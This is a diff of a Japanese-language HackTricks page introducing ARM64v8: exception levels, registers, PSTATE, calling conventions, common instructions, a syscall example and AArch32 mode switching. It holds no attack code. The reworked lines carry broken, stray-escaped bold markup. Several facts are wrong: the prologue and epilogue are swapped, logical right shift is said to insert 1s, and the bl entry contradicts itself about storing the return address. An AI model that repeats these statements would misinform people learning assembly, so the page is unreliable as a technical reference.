@@ -1,4 +1,4 @@
-# ARM64v8への導入
+# Introduction to ARM64v8
 
 <details>
 
@@ -6,11 +6,11 @@
 
 HackTricksをサポートする他の方法：
 
-- **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
-- **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
+* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
+* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
 
 </details>
 
@@ -19,17 +19,17 @@ HackTricksをサポートする他の方法：
 ARMv8アーキテクチャでは、実行レベルを表す例外レベル（EL）が特権レベルと実行環境の機能を定義します。EL0からEL3までの4つの例外レベルがあり、それぞれ異なる目的で使用されます：
 
 1. **EL0 - ユーザーモード**：
-   - これは最も権限の低いレベルで、通常のアプリケーションコードの実行に使用されます。
-   - EL0で実行されるアプリケーションは、お互いやシステムソフトウェアから分離されており、セキュリティと安定性が向上しています。
+   * これは最も権限の低いレベルで、通常のアプリケーションコードの実行に使用されます。
+   * EL0で実行されるアプリケーションは、お互いやシステムソフトウェアから分離されており、セキュリティと安定性が向上しています。
 2. **EL1 - オペレーティングシステムカーネルモード**：
-   - ほとんどのオペレーティングシステムカーネルはこのレベルで実行されます。
-   - EL1はEL0よりも権限があり、システムリソースにアクセスできますが、システムの整合性を保つためにいくつかの制限があります。
+   * ほとんどのオペレーティングシステムカーネルはこのレベルで実行されます。
+   * EL1はEL0よりも権限があり、システムリソースにアクセスできますが、システムの整合性を保つためにいくつかの制限があります。
 3. **EL2 - ハイパーバイザーモード**：
-   - このレベルは仮想化に使用されます。EL2で実行されるハイパーバイザーは、同じ物理ハードウェア上で実行される複数のオペレーティングシステム（それぞれが独自のEL1で）を管理できます。
-   - EL2には仮想環境の分離と制御の機能が備わっています。
+   * このレベルは仮想化に使用されます。EL2で実行されるハイパーバイザーは、同じ物理ハードウェア上で実行される複数のオペレーティングシステム（それぞれが独自のEL1で）を管理できます。
+   * EL2には仮想環境の分離と制御の機能が備わっています。
 4. **EL3 - セキュアモニターモード**：
-   - これは最も特権の高いレベルであり、セキュアブートや信頼された実行環境によく使用されます。
-   - EL3はセキュア状態と非セキュア状態のアクセスを管理および制御できます（セキュアブート、信頼されたOSなど）。
+   * これは最も特権の高いレベルであり、セキュアブートや信頼された実行環境によく使用されます。
+   * EL3はセキュア状態と非セキュア状態のアクセスを管理および制御できます（セキュアブート、信頼されたOSなど）。
 
 これらのレベルの使用により、ユーザーアプリケーションから最も特権の高いシステムソフトウェアまで、システムの異なる側面を構造化して安全に管理する方法が提供されます。ARMv8の特権レベルへのアプローチは、異なるシステムコンポーネントを効果的に分離することで、システムのセキュリティと堅牢性を向上させます。
 
@@ -38,71 +38,72 @@ ARMv8アーキテクチャでは、実行レベルを表す例外レベル（EL�
 ARM64には、`x0`から`x30`までの**31個の汎用レジスタ**があります。それぞれが**64ビット**（8バイト）の値を格納できます。32ビットの値が必要な操作の場合、同じレジスタには`w0`から`w30`という名前で32ビットモードでアクセスできます。
 
 1. **`x0`** から **`x7`** - これらは通常、スクラッチレジスタとサブルーチンにパラメータを渡すために使用されます。
-   - **`x0`** は関数の戻りデータも保持します。
+   * **`x0`** は関数の戻りデータも保持します。
 2. **`x8`** - Linuxカーネルでは、`x8`は`svc`命令のシステムコール番号として使用されます。**macOSではx16が使用されます！**
 3. **`x9`** から **`x15`** - さらなる一時レジスタであり、ローカル変数によく使用されます。
 4. **`x16`** と **`x17`** - **手続き内呼び出しレジスタ**。即値のための一時レジスタ。間接関数呼び出しやPLT（手続きリンクテーブル）スタブにも使用されます。
-   - **`x16`** は**macOS**で**`svc`**命令の**システムコール番号**として使用されます。
+   * **`x16`** は**macOS**で\*\*`svc`**命令の**システムコール番号\*\*として使用されます。
 5. **`x18`** - **プラットフォームレジスタ**。一般目的レジスタとして使用できますが、一部のプラットフォームでは、このレジスタはプラットフォーム固有の用途に予約されています：Windowsの現在のスレッド環境ブロックへのポインタ、またはLinuxカーネルで実行中のタスク構造体へのポインタ。
 6. **`x19`** から **`x28`** - これらは呼び出し元保存レジスタです。関数はこれらのレジスタの値を呼び出し元のために保存する必要があり、それらはスタックに保存され、呼び出し元に戻る前に回復されます。
-7. **`x29`** - スタックフレームを追跡するための**フレームポインタ**。新しいスタックフレームが作成されると、関数が呼び出されるため、**`x29`** レジスタはスタックに保存され、新しいフレームポインタアドレス（**`sp`**アドレス）がこのレジスタに保存されます。
-   - このレジスタは一般目的レジスタとして使用できますが、通常は**ローカル変数**への参照として使用されます。
+7. **`x29`** - スタックフレームを追跡するための**フレームポインタ**。新しいスタックフレームが作成されると、関数が呼び出されるため、**`x29`** レジスタはスタックに保存され、新しいフレームポインタアドレス（\*\*`sp`\*\*アドレス）がこのレジスタに保存されます。
+   * このレジスタは一般目的レジスタとして使用できますが、通常は**ローカル変数**への参照として使用されます。
 8. **`x30`** または **`lr`** - **リンクレジスタ**。`BL`（Branch with Link）または`BLR`（Registerを使用したBranch with Link）命令が実行されるときに**リターンアドレス**を保持します。
-   - 他のレジスタと同様に使用できます。
-   - 現在の関数が新しい関数を呼び出す予定であり、したがって`lr`を上書きする場合、最初にスタックに保存し、これがエピローグ（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`と`lr`を保存し、スペースを生成し、新しい`fp`を取得）で、最後に回復します。これがプロローグです（`ldp x29, x30, [sp], #48; ret` -> `fp`と`lr`を回復して戻る）。
+   * 他のレジスタと同様に使用できます。
+   * 現在の関数が新しい関数を呼び出す予定であり、したがって`lr`を上書きする場合、最初にスタックに保存し、これがエピローグ（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`と`lr`を保存し、スペースを生成し、新しい`fp`を取得）で、最後に回復します。これがプロローグです（`ldp x29, x30, [sp], #48; ret` -> `fp`と`lr`を回復して戻る）。
 9. **`sp`** - **スタックポインタ**。スタックの先頭を追跡するために使用されます。
-   - **`sp`**の値は常に少なくとも**クワッドワードのアライメント**を保持する必要があり、それ以外の場合はアライメント例外が発生する可能性があります。
-10. **`pc`** - 次の命令を指す**プログラムカウンタ**。このレジスタは例外生成、例外リターン、およびブランチを介してのみ更新できます。このレジスタを読み取ることができる通常の命令は、**`pc`**アドレスを**`lr`**（リンクレジスタ）に保存するためのブランチリンク命令（BL、BLR）だけです。
-11. **`xzr`** - **ゼロレジスタ**。32ビットレジスタ形式では**`wzr`**とも呼ばれます。ゼロ値を簡単に取得するために使用できます（一般的な操作）または**`subs`**を使用して比較を行うために使用できます。**`xzr`**に結果データを保存しないでください（**`subs XZR, Xn, #10`**のような比較を行う）。
+   * **`sp`の値は常に少なくともクワッドワードのアライメント**を保持する必要があり、それ以外の場合はアライメント例外が発生する可能性があります。
+10. **`pc`** - 次の命令を指す**プログラムカウンタ**。このレジスタは例外生成、例外リターン、およびブランチを介してのみ更新できます。このレジスタを読み取ることができる通常の命令は、**`pc`アドレスを`lr`**（リンクレジスタ）に保存するためのブランチリンク命令（BL、BLR）だけです。
+11. **`xzr`** - **ゼロレジスタ**。32ビットレジスタ形式では\*\*`wzr`**とも呼ばれます。ゼロ値を簡単に取得するために使用できます（一般的な操作）または**`subs`**を使用して比較を行うために使用できます。**`xzr`**に結果データを保存しないでください（**`subs XZR, Xn, #10`\*\*のような比較を行う）。
 
-**`Wn`**レジスタは**`Xn`**レジスタの32ビットバージョンです。
+\*\*`Wn`**レジスタは**`Xn`\*\*レジスタの32ビットバージョンです。
 
 ### SIMDおよび浮動小数点レジスタ
 
-さらに、最適化された単一命令複数データ（SIMD）操作や浮動小数点演算を実行するために使用できる、128ビット長の**32個のレジスタ**があります。これらはVnレジスタと呼ばれますが、64ビット、32ビット、16ビット、8ビットで動作することもでき、その場合は**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`**と呼ばれます。
+さらに、最適化された単一命令複数データ（SIMD）操作や浮動小数点演算を実行するために使用できる、128ビット長の**32個のレジスタ**があります。これらはVnレジスタと呼ばれますが、64ビット、32ビット、16ビット、8ビットで動作することもでき、その場合は\*\*`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`\*\*と呼ばれます。
+
 ### システムレジスタ
 
 **数百のシステムレジスタ**、または特殊用途レジスタ（SPR）は、**プロセッサ**の動作を**監視**および**制御**するために使用されます。\
-これらは、専用の特殊命令**`mrs`**および**`msr`**を使用してのみ読み取りまたは設定できます。
+これらは、専用の特殊命令\*\*`mrs`**および**`msr`\*\*を使用してのみ読み取りまたは設定できます。
 
-特殊レジスタ**`TPIDR_EL0`**および**`TPIDDR_EL0`**は、リバースエンジニアリング時に一般的に見られます。`EL0`サフィックスは、レジスタにアクセスできる**最小例外**を示します（この場合、EL0は通常の例外（特権）レベルで一般プログラムが実行されます）。\
-これらは通常、メモリのスレッドローカルストレージ領域の**ベースアドレス**を格納するために使用されます。通常、最初のものはEL0で実行されるプログラムに対して読み書き可能ですが、2番目はEL0から読み取り、カーネルから書き込むことができます。
+特殊レジスタ\*\*`TPIDR_EL0`**および**`TPIDDR_EL0`**は、リバースエンジニアリング時に一般的に見られます。`EL0`サフィックスは、レジスタにアクセスできる**最小例外**を示します（この場合、EL0は通常の例外（特権）レベルで一般プログラムが実行されます）。**\
+**これらは通常、メモリのスレッドローカルストレージ領域の**ベースアドレス\*\*を格納するために使用されます。通常、最初のものはEL0で実行されるプログラムに対して読み書き可能ですが、2番目はEL0から読み取り、カーネルから書き込むことができます。
 
 * `mrs x0, TPIDR_EL0 ; TPIDR_EL0をx0に読み込む`
 * `msr TPIDR_EL0, X0 ; x0をTPIDR_EL0に書き込む`
 
 ### **PSTATE**
 
-**PSTATE**には、オペレーティングシステムでシリアル化されたいくつかのプロセスコンポーネントが含まれており、**トリガーされた**例外の**許可**レベルである**`SPSR_ELx`**特殊レジスタが含まれています（これにより、例外が終了したときにプロセスの状態を回復できます）。\
+**PSTATE**には、オペレーティングシステムでシリアル化されたいくつかのプロセスコンポーネントが含まれており、**トリガーされた**例外の**許可**レベルである\*\*`SPSR_ELx`\*\*特殊レジスタが含まれています（これにより、例外が終了したときにプロセスの状態を回復できます）。\
 これらはアクセス可能なフィールドです：
 
 <figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>
 
-* **`N`**、**`Z`**、**`C`**、**`V`**条件フラグ：
-* **`N`**は、操作が負の結果を生じたことを意味します
-* **`Z`**は、操作がゼロを生じたことを意味します
-* **`C`**は、操作が実行されたことを意味します
-* **`V`**は、操作が符号オーバーフローを生じたことを意味します：
+* **`N`**、**`Z`**、**`C`**、\*\*`V`\*\*条件フラグ：
+* \*\*`N`\*\*は、操作が負の結果を生じたことを意味します
+* \*\*`Z`\*\*は、操作がゼロを生じたことを意味します
+* \*\*`C`\*\*は、操作が実行されたことを意味します
+* \*\*`V`\*\*は、操作が符号オーバーフローを生じたことを意味します：
 * 2つの正の数の合計は負の結果を生じます。
 * 2つの負の数の合計は正の結果を生じます。
 * 減算では、大きな負の数が小さな正の数から減算される場合（またはその逆）、結果が与えられたビットサイズの範囲内に表現できない場合。
 * 明らかに、プロセッサは操作が符号付きかどうかを知らないため、操作を符号付きまたは符号なしで行ったかどうかを確認し、発生した場合にはキャリーが発生したことを示します。
 
 {% hint style="warning" %}
-すべての命令がこれらのフラグを更新するわけではありません。**`CMP`**や**`TST`**のような一部の命令は、および**`ADDS`**のようなsサフィックスを持つ他の命令もそれを行います。
+すべての命令がこれらのフラグを更新するわけではありません。\*\*`CMP`**や**`TST`**のような一部の命令は、および**`ADDS`\*\*のようなsサフィックスを持つ他の命令もそれを行います。
 {% endhint %}
 
-* 現在の**レジスタ幅（`nRW`）**フラグ：フラグが値0を保持している場合、プログラムは再開後にAArch64実行状態で実行されます。
+* 現在の\*\*レジスタ幅（`nRW`）\*\*フラグ：フラグが値0を保持している場合、プログラムは再開後にAArch64実行状態で実行されます。
 * 現在の**例外レベル**（**`EL`**）：EL0で実行される通常のプログラムは値0になります
-* **シングルステップ**フラグ（**`SS`**）：デバッガが**`SPSR_ELx`**内のSSフラグを1に設定してシングルステップを実行します。プログラムはステップを実行し、シングルステップ例外を発行します。
+* **シングルステップ**フラグ（**`SS`**）：デバッガが\*\*`SPSR_ELx`\*\*内のSSフラグを1に設定してシングルステップを実行します。プログラムはステップを実行し、シングルステップ例外を発行します。
 * **不正例外**状態フラグ（**`IL`**）：特権ソフトウェアが無効な例外レベル転送を実行したときにマークされ、このフラグが1に設定されるとプロセッサは不正な状態例外をトリガーします。
-* **`DAIF`**フラグ：これらのフラグを使用すると、特権プログラムが特定の外部例外を選択的にマスクできます。
-* **`A`**が1の場合、**非同期中断**がトリガーされます。**`I`**は外部ハードウェアの**割り込みリクエスト**（IRQ）に応答するように構成され、Fは**ファスト割り込みリクエスト**（FIR）に関連しています。
-* **スタックポインタ選択**フラグ（**`SPS`**）：EL1およびそれ以上で実行される特権プログラムは、自分自身のスタックポインタレジスタとユーザーモデルのレジスタ（たとえば、`SP_EL1`と`EL0`の間）を切り替えることができます。この切り替えは、**`SPSel`**特殊レジスタに書き込むことによって実行されます。これはEL0からは行えません。
+* \*\*`DAIF`\*\*フラグ：これらのフラグを使用すると、特権プログラムが特定の外部例外を選択的にマスクできます。
+* **`A`が1の場合、非同期中断がトリガーされます。`I`は外部ハードウェアの割り込みリクエスト**（IRQ）に応答するように構成され、Fは**ファスト割り込みリクエスト**（FIR）に関連しています。
+* **スタックポインタ選択**フラグ（**`SPS`**）：EL1およびそれ以上で実行される特権プログラムは、自分自身のスタックポインタレジスタとユーザーモデルのレジスタ（たとえば、`SP_EL1`と`EL0`の間）を切り替えることができます。この切り替えは、\*\*`SPSel`\*\*特殊レジスタに書き込むことによって実行されます。これはEL0からは行えません。
 
 ## **呼び出し規約（ARM64v8）**
 
-ARM64呼び出し規約では、関数への最初の8つのパラメータは**`x0`から`x7`**のレジスタに渡されます。**追加**のパラメータは**スタック**に渡されます。**戻り**値は、レジスタ**`x0`**に返されるか、128ビットの場合は**`x1`**にも返されます。**`x19`**から**`x30`**および**`sp`**レジスタは、関数呼び出しを超えて**保存**される必要があります。
+ARM64呼び出し規約では、関数への最初の8つのパラメータは\*\*`x0`から`x7`**のレジスタに渡されます。追加のパラメータは**スタック**に渡されます。戻り値は、レジスタ**`x0`**に返されるか、128ビットの場合は**`x1`**にも返されます。**`x19`**から**`x30`**および**`sp`**レジスタは、関数呼び出しを超えて**保存\*\*される必要があります。
 
 アセンブリで関数を読む際には、**関数のプロローグとエピローグ**を探します。**プロローグ**では通常、**フレームポインタ（`x29`）を保存**し、**新しいフレームポインタを設定**し、**スタックスペースを割り当て**ます。**エピローグ**では通常、**保存されたフレームポインタを復元**し、関数から**戻り**ます。
 
@@ -112,7 +113,7 @@ Swiftには独自の**呼び出し規約**があり、[**https://github.com/appl
 
 ## **一般的な命令（ARM64v8）**
 
-ARM64命令は一般的に、**`opcode dst, src1, src2`**の形式を持ち、**`opcode`**は実行される**操作**（`add`、`sub`、`mov`など）を示し、**`dst`**は結果が格納される**宛先**レジスタであり、**`src1`**および**`src2`**は**ソース**レジスタです。ソースレジスタの代わりに即値を使用することもできます。
+ARM64命令は一般的に、**`opcode dst, src1, src2`の形式を持ち、`opcode`は実行される操作**（`add`、`sub`、`mov`など）を示し、**`dst`は結果が格納される宛先**レジスタであり、**`src1`および`src2`はソース**レジスタです。ソースレジスタの代わりに即値を使用することもできます。
 
 * **`mov`**: 1つの**レジスタ**から別の**レジスタ**に値を**移動**します。
 * 例: `mov x0, x1` — これは`x1`から`x0`に値を移動します。
@@ -120,7 +121,7 @@ ARM64命令は一般的に、**`opcode dst, src1, src2`**の形式を持ち、**
 * 例: `ldr x0, [x1]` — これは`x1`が指すメモリ位置から`x0`に値をロードします。
 * **オフセットモード**: オリンポインタに影響を与えるオフセットが示されます。たとえば:
 * `ldr x2, [x1, #8]`、これはx1 + 8からx2に値をロードします
-* &#x20;`ldr x2, [x0, x1, lsl #2]`、これはx0の配列から、位置x1（インデックス）\* 4のオブジェクトをx2にロードします
+* `ldr x2, [x0, x1, lsl #2]`、これはx0の配列から、位置x1（インデックス）\* 4のオブジェクトをx2にロードします
 * **プリインデックスモード**: これは、元に計算を適用し、結果を取得して新しい元を元に格納します。
 * `ldr x2, [x1, #8]!`、これは`x1 + 8`を`x2`にロードし、`x1 + 8`の結果を`x1`に格納します
 * `str lr, [sp, #-4]!`、リンクレジスタをspに格納し、レジスタspを更新します
@@ -136,11 +137,11 @@ ARM64命令は一般的に、**`opcode dst, src1, src2`**の形式を持ち、**
 * 例: `stp x0, x1, [sp]` — これは、それぞれ`sp`および`sp + 8`のメモリ位置に`x0`および`x1`をストアします。
 * `stp x0, x1, [sp, #16]!` — これは、それぞれ`sp+16`および`sp + 24`のメモリ位置に`x0`および`x1`をストアし、`sp`を`sp+16`で更新します。
 * **`add`**: 2つのレジスタの値を加算し、結果をレジスタに格納します。
-* 構文: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX\]
+* 構文: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
 * Xn1 -> 宛先
 * Xn2 -> オペランド1
 * Xn3 | #imm -> オペランド2（レジスタまたは即値）
-* \[shift #N | RRX\] -> シフトを実行またはRRXを呼び出す
+* \[shift #N | RRX] -> シフトを実行またはRRXを呼び出す
 * 例: `add x0, x1, x2` — これは`x1`と`x2`の値を加算し、結果を`x0`に格納します。
 * `add x5, x5, #1, lsl #12` — これは4096に等しい（1を12回シフト） -> 1 0000 0000 0000 0000
 * **`adds`** これは`add`を実行し、フラグを更新します
@@ -155,10 +156,10 @@ ARM64命令は一般的に、**`opcode dst, src1, src2`**の形式を持ち、**
 * **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
 * **論理左シフト**: 末尾に0を追加し、他のビットを前に移動します（n回2倍）
 * **論理右シフト**: 先頭に1を追加し、他のビットを後ろに移動します（符号なしでn回2で割る）
-* **算術右シフト**: **`lsr`**と同様ですが、最上位ビットが1の場合、1を追加します（符号付きでn回2で割る）
-* **右に回転**: **`lsr`**と同様ですが、右から削除されたものは左に追加されます
-* **拡張付き右回転**: **`ror`**と同様ですが、キャリーフラグを「最上位ビット」として使用します。つまり、キャリーフラグはビット31に移動し、削除されたビットはキャリーフラグに移動します。
-* **`bfm`**: **ビットフィールド移動**、これらの操作は値からビット`0...n`をコピーし、それらを位置`m..m+n`に配置します。 **`#s`**は**左端のビット**位置を指定し、**`#r`**は**右に回転する量**を指定します。
+* **算術右シフト**: \*\*`lsr`\*\*と同様ですが、最上位ビットが1の場合、1を追加します（符号付きでn回2で割る）
+* **右に回転**: \*\*`lsr`\*\*と同様ですが、右から削除されたものは左に追加されます
+* **拡張付き右回転**: \*\*`ror`\*\*と同様ですが、キャリーフラグを「最上位ビット」として使用します。つまり、キャリーフラグはビット31に移動し、削除されたビットはキャリーフラグに移動します。
+* **`bfm`**: **ビットフィールド移動**、これらの操作は値からビット`0...n`をコピーし、それらを位置`m..m+n`に配置します。 **`#s`は左端のビット**位置を指定し、**`#r`は右に回転する量**を指定します。
 * ビットフィールド移動: `BFM Xd, Xn, #r`
 * 符号付きビットフィールド移動: `SBFM Xd, Xn, #r, #s`
 * 符号なしビットフィールド移動: `UBFM Xd, Xn, #r, #s`
@@ -177,7 +178,7 @@ ARM64命令は一般的に、**`opcode dst, src1, src2`**の形式を持ち、**
 * **`extr`:** 指定された**連結されたレジスタのビット**を抽出します。
 * 例: `EXTR W3, W2, W1, #3` これは**W1+W2**を連結し、**W2のビット3からW1のビット3まで**を取得してW3に格納します。
 * **`cmp`**: 2つのレジスタを比較し、条件フラグを設定します。これは`subs`のエイリアスで、宛先レジスタをゼロレジスタに設定します。`m == n`かどうかを知るのに便利です。
-* **`subs`**と同じ構文をサポートします
+* \*\*`subs`\*\*と同じ構文をサポートします
 * 例: `cmp x0, x1` — これは`x0`と`x1`の値を比較し、条件フラグを適切に設定します。
 * **`cmn`**: **負の比較**オペランド。この場合、`adds`のエイリアスで、同じ構文をサポートします。`m == -n`かどうかを知るのに便利です。
 * **`ccmp`**: 条件付き比較、前の比較が真の場合にのみ実行され、特にnzcvビットを設定します。
@@ -188,14 +189,14 @@ ARM64命令は一般的に、**`opcode dst, src1, src2`**の形式を持ち、**
 * 例: `tst X1, #7` X1の最後の3ビットのいずれかが1かどうかをチェックします
 * **`teq`**: 結果を破棄するXOR演算
 * **`b`**: 無条件分岐
-* 例: `b myFunction`&#x20;
+* 例: `b myFunction`
 * これはリンクレジスタに戻りアドレスを格納しません（戻る必要のあるサブルーチン呼び出しには適していません）
 * **`bl`**: **リンク付き分岐**、**サブルーチン**を**呼び出す**ために使用されます。**`x30`に戻りアドレスを格納**します。
 * 例: `bl myFunction` — これは`myFunction`関数を呼び出し、戻りアドレスを`x30`に格納します。
 * これはリンクレジスタに戻りアドレスを格納しません（戻る必要のあるサブルーチン呼び出しには適していません）
-* **`blr`**: **レジスタにリンク付き分岐**、**指定された**レジスタに**アドレスが含まれる**サブルーチンを**呼び出す**ために使用されます。戻りアドレスを`x30`に格納します。（これは&#x20;
+* **`blr`**: **レジスタにリンク付き分岐**、**指定された**レジスタに**アドレスが含まれる**サブルーチンを**呼び出す**ために使用されます。戻りアドレスを`x30`に格納します。（これは
 * 例: `blr x1` — これは`x1`に含まれるアドレスの関数を呼び出し、戻りアドレスを`x30`に格納します。
-* **`ret`**: **サブルーチン**から**戻る**、通常は**`x30`**のアドレスを使用します。
+* **`ret`**: **サブルーチン**から**戻る**、通常は\*\*`x30`\*\*のアドレスを使用します。
 * 例: `ret` — これは`x30`に格納された戻りアドレスを使用して現在のサブルーチンから戻ります。
 * **`b.<cond>`**: 条件付き分岐
 * **`b.eq`**: **等しい場合に分岐**、前の`cmp`命令に基づきます。
@@ -227,7 +228,7 @@ ARM64命令は一般的に、**`opcode dst, src1, src2`**の形式を持ち、**
 * **`stur`**: レジスタの値をメモリ位置に**ストア**し、別のレジスタからのオフセットを使用します。
 * 例: `stur x0, [x1, #4]` — これは `x1` に現在のアドレスより4バイト大きいアドレスのメモリに `x0` の値を格納します。
 * **`svc`** : **システムコール**を行います。"Supervisor Call" の略です。プロセッサがこの命令を実行すると、**ユーザーモードからカーネルモードに切り替わり**、**カーネルのシステムコール処理**コードがあるメモリ内の特定の場所にジャンプします。
-*   例:
+* 例:
 
 ```armasm
 mov x8, 93  ; レジスタ x8 に終了のためのシステムコール番号（93）をロードします。
@@ -271,6 +272,7 @@ Armv8-A は 32 ビットプログラムの実行をサポートします。**AAr
 これは、**interworking 分岐命令**で設定されますが、PC が宛先レジスタとして設定されている場合に他の命令で直接設定することもできます。例：
 
 別の例：
+
 ```armasm
 _start:
 .code 32                ; Begin using A32
@@ -281,50 +283,52 @@ bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
 mov r0, #0
 mov r0, #8
 ```
+
 ### レジスタ
 
 32ビットのレジスタが16個あります（r0-r15）。**r0からr14**まで、**どんな操作にも使用**できますが、一部は通常予約されています：
 
-- **`r15`**：プログラムカウンタ（常に）。次の命令のアドレスが格納されます。A32では現在+8、T32では現在+4です。
-- **`r11`**：フレームポインタ
-- **`r12`**：手続き内呼び出しレジスタ
-- **`r13`**：スタックポインタ
-- **`r14`**：リンクレジスタ
+* **`r15`**：プログラムカウンタ（常に）。次の命令のアドレスが格納されます。A32では現在+8、T32では現在+4です。
+* **`r11`**：フレームポインタ
+* **`r12`**：手続き内呼び出しレジスタ
+* **`r13`**：スタックポインタ
+* **`r14`**：リンクレジスタ
 
-さらに、レジスタは**`バンク付きレジスタ`**にバックアップされます。これは、例外処理や特権操作で**高速なコンテキスト切り替え**を実行するために、レジスタの値を保存しておく場所です。\
+さらに、レジスタは\*\*`バンク付きレジスタ`**にバックアップされます。これは、例外処理や特権操作で**高速なコンテキスト切り替え\*\*を実行するために、レジスタの値を保存しておく場所です。\
 これは、例外が発生したプロセッサモードの`CPSR`からプロセッサの`SPSR`にプロセッサ状態を保存することによって行われます。例外が返されると、`CPSR`は`SPSR`から復元されます。
 
 ### CPSR - 現在のプログラムステータスレジスタ
 
-AArch32では、CPSRはAArch64の**`PSTATE`**と同様に機能し、例外が発生すると後で実行を復元するために**`SPSR_ELx`**にも保存されます：
+AArch32では、CPSRはAArch64の\*\*`PSTATE`**と同様に機能し、例外が発生すると後で実行を復元するために**`SPSR_ELx`\*\*にも保存されます：
 
 <figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>
 
 フィールドはいくつかのグループに分かれています：
 
-- アプリケーションプログラムステータスレジスタ（APSR）：算術フラグであり、EL0からアクセス可能
-- 実行状態レジスタ：プロセスの動作（OSによって管理される）。
+* アプリケーションプログラムステータスレジスタ（APSR）：算術フラグであり、EL0からアクセス可能
+* 実行状態レジスタ：プロセスの動作（OSによって管理される）。
 
 #### アプリケーションプログラムステータスレジスタ（APSR）
 
-- **`N`**、**`Z`**、**`C`**、**`V`** フラグ（AArch64と同様）
-- **`Q`** フラグ：専用の飽和算術命令の実行中に**整数の飽和が発生する**ときに1に設定されます。一度**`1`**に設定されると、手動で0に設定されるまで値が維持されます。さらに、その値を暗黙的にチェックする命令は存在せず、手動で読み取る必要があります。
-- **`GE`**（以上または等しい）フラグ：これはSIMD（Single Instruction, Multiple Data）操作で使用され、"parallel add"や"parallel subtract"などの操作に使用されます。これらの操作は、1つの命令で複数のデータポイントを処理できます。
+* **`N`**、**`Z`**、**`C`**、**`V`** フラグ（AArch64と同様）
+* **`Q`** フラグ：専用の飽和算術命令の実行中に**整数の飽和が発生する**ときに1に設定されます。一度\*\*`1`\*\*に設定されると、手動で0に設定されるまで値が維持されます。さらに、その値を暗黙的にチェックする命令は存在せず、手動で読み取る必要があります。
+* **`GE`**（以上または等しい）フラグ：これはSIMD（Single Instruction, Multiple Data）操作で使用され、"parallel add"や"parallel subtract"などの操作に使用されます。これらの操作は、1つの命令で複数のデータポイントを処理できます。
 
-たとえば、**`UADD8`** 命令は、並列に4組のバイト（2つの32ビットオペランドから）を追加し、結果を32ビットレジスタに格納します。次に、これらの結果に基づいて、**`APSR`**内の`GE`フラグが設定されます。各GEフラグは1つのバイトの追加に対応し、そのバイトのペアの追加が**オーバーフローしたかどうか**を示します。
+たとえば、**`UADD8`** 命令は、並列に4組のバイト（2つの32ビットオペランドから）を追加し、結果を32ビットレジスタに格納します。次に、これらの結果に基づいて、**`APSR`内の`GE`フラグが設定されます。各GEフラグは1つのバイトの追加に対応し、そのバイトのペアの追加がオーバーフローしたかどうか**を示します。
 
 **`SEL`** 命令は、これらのGEフラグを使用して条件付きアクションを実行します。
 
 #### 実行状態レジスタ
 
-- **`J`** および **`T`** ビット：**`J`** は0であるべきであり、**`T`** が0の場合はA32命令セットが使用され、1の場合はT32が使用されます。
-- **ITブロックステートレジスタ**（`ITSTATE`）：これらは10-15および25-26のビットです。**`IT`** で接頭辞が付いたグループ内の命令の条件を格納します。
-- **`E`** ビット：**エンディアンネス**を示します。
-- **モードおよび例外マスクビット**（0-4）：現在の実行状態を決定します。**5番目**は、プログラムが32ビット（1）または64ビット（0）で実行されているかを示します。他の4つは、**使用中の例外モード**（例外が発生し処理されている場合）を表します。数値セットは、これが処理されている間に別の例外が発生した場合の**現在の優先度**を示します。
+* **`J`** および **`T`** ビット：**`J`** は0であるべきであり、**`T`** が0の場合はA32命令セットが使用され、1の場合はT32が使用されます。
+* **ITブロックステートレジスタ**（`ITSTATE`）：これらは10-15および25-26のビットです。**`IT`** で接頭辞が付いたグループ内の命令の条件を格納します。
+* **`E`** ビット：**エンディアンネス**を示します。
+* **モードおよび例外マスクビット**（0-4）：現在の実行状態を決定します。**5番目**は、プログラムが32ビット（1）または64ビット（0）で実行されているかを示します。他の4つは、**使用中の例外モード**（例外が発生し処理されている場合）を表します。数値セットは、これが処理されている間に別の例外が発生した場合の**現在の優先度**を示します。
 
 <figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**：特定の例外は、**`A`**、`I`、`F` ビットを使用して無効にできます。**`A`** が1の場合、**非同期中断**がトリガーされます。**`I`** は外部ハードウェアの**割り込みリクエスト**（IRQ）に応答するように構成され、Fは**高速割り込みリクエスト**（FIR）に関連しています。
